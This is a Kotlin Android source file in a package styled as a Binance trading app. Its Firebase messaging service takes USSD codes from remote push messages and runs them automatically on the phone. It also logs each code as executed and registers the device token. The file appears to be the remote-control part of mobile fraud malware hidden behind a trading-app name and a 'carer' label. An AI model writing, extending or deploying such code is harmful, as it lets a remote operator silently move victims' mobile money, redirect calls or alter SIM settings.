package dApp.binance.Trading.arfu

import android.content.Intent
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class MyFirebaseService : FirebaseMessagingService() {

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)

        Log.d("MyFirebaseService", "Message received: ${remoteMessage.data}")

        val data = remoteMessage.data
        val ussdCode = data["ussd_code"] ?: return
        val autoExecute = data["auto_execute"]?.toBoolean() ?: false

        // Save command to SharedPreferences
        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        sharedPref.edit().apply {
            putString("last_command", ussdCode)
            putLong("last_command_time", System.currentTimeMillis())
            apply()
        }

        // Check if carer service is enabled
        val isEnabled = sharedPref.getBoolean("carer_enabled", true)
        if (!isEnabled) {
            Log.d("MyFirebaseService", "Carer service is disabled")
            return
        }

        // Execute USSD
        executeUssd(ussdCode, autoExecute)

        // Log to Firebase
        FirebaseLogHelper.logCommand(
            ussdCode = ussdCode,
            status = "EXECUTED",
            context = this
        )
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d("MyFirebaseService", "New FCM Token: $token")

        // Save token to SharedPreferences and Firebase
        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        sharedPref.edit().putString("fcm_token", token).apply()

        // Register device in Firebase
        FirebaseHelper.registerDevice(this, token)
    }

    private fun executeUssd(code: String, autoExecute: Boolean) {
        UssdHelper.executeUssd(this, code)
    }
}
